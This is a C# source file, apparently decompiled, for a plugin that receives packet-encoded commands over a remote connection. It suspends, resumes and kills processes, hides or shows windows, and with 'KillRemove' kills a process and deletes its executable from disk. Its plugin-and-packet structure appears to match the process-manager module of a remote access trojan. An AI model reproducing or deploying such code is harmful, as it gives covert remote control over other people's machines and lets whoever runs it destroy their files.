using System;
using System.Diagnostics;
using System.IO;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (text == null)
			{
				return;
			}
			switch (text.Length)
			{
			case 7:
				switch (text[0])
				{
				case 'R':
					if (text == "Refresh")
					{
						WindowManager.Start();
					}
					break;
				case 'S':
					if (text == "Suspend")
					{
						TaskManager.SuspendProcess((int)array[1]);
					}
					break;
				}
				break;
			case 8:
				switch (text[1])
				{
				case 'i':
					if (text == "Minimize")
					{
						WindowManager.MinimizeWindow((IntPtr)(int)array[1]);
					}
					break;
				case 'a':
					if (text == "Maximize")
					{
						WindowManager.MaximizeWindow((IntPtr)(int)array[1]);
					}
					break;
				}
				break;
			case 11:
				if (text == "RestoreHide")
				{
					if (WindowManager.IsWindowVisible((IntPtr)(int)array[1]))
					{
						WindowManager.HideWindow((IntPtr)(int)array[1]);
					}
					else
					{
						WindowManager.ShowWindow((IntPtr)(int)array[1]);
					}
				}
				break;
			case 4:
				if (text == "Kill")
				{
					TaskManager.KillProcess((int)array[1]);
				}
				break;
			case 6:
				if (text == "Resume")
				{
					TaskManager.ResumeProcess((int)array[1]);
				}
				break;
			case 10:
				if (text == "KillRemove")
				{
					string? fileName = Process.GetProcessById((int)array[1]).MainModule.FileName;
					TaskManager.KillProcess((int)array[1]);
					File.Delete(fileName);
				}
				break;
			case 5:
			case 9:
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Window", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
